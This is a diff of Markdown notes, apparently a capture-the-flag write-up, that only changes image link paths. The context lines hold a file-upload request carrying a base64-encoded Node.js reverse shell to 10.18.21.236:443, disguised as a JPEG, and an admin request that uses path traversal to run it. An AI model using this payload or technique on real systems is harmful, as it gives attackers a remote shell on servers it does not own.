@@ -21,7 +21,7 @@ Apparently what the server catches is the file name, as this is out revsh with t
 
 Where are the files uploaded? It's supposed to be loaded on the front screen with the other images. Where are they?
 
-![[Pasted image 20240401112911.png|900]]
+![[Images/Pasted image 20240401112911.png|900]]
 On mouse over one of the images shows the path being "content"
 
 Feroxbuster
@@ -55,7 +55,7 @@ ZZY
 ZZZ
 ```
 
-![[Pasted image 20240401150638.png]]
+![[Images/Pasted image 20240401150638.png]]
 
 Node js rev sh script, no magic number:
 ```js
@@ -92,9 +92,9 @@ Sec-GPC: 1
 {"name":"revsh.jpg","type":"image/jpeg","file":"data:image/jpeg;base64,KGZ1bmN0aW9uKCl7CiAgICB2YXIgbmV0ID0gcmVxdWlyZSgibmV0IiksCiAgICAgICAgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksCiAgICAgICAgc2ggPSBjcC5zcGF3bigiL2Jpbi9zaCIsIFtdKTsKICAgIHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwogICAgY2xpZW50LmNvbm5lY3QoNDQzLCAiMTAuMTguMjEuMjM2IiwgZnVuY3Rpb24oKXsKICAgICAgICBjbGllbnQucGlwZShzaC5zdGRpbik7CiAgICAgICAgc2guc3Rkb3V0LnBpcGUoY2xpZW50KTsKICAgICAgICBzaC5zdGRlcnIucGlwZShjbGllbnQpOwogICAgfSk7CiAgICByZXR1cm4gL2EvOyAvLyBQcmV2ZW50cyB0aGUgTm9kZS5qcyBhcHBsaWNhdGlvbiBmcm9tIGNyYXNoaW5nCn0pKCk7Cg=="}
 ```
 
-![[Pasted image 20240401200332.png]]
+![[Images/Pasted image 20240401200332.png]]
 
-![[Pasted image 20240401150452.png]]
+![[Images/Pasted image 20240401150452.png]]
 
 ```http
 POST /admin HTTP/1.1
@@ -117,7 +117,7 @@ cmd=..%2Fcontent%2FLBB.jpg..
 
 ```
 
-![[Pasted image 20240401200446.png]]
+![[Images/Pasted image 20240401200446.png]]
 
 ```sh
 ┌──(kali㉿kali)-[~/shells]
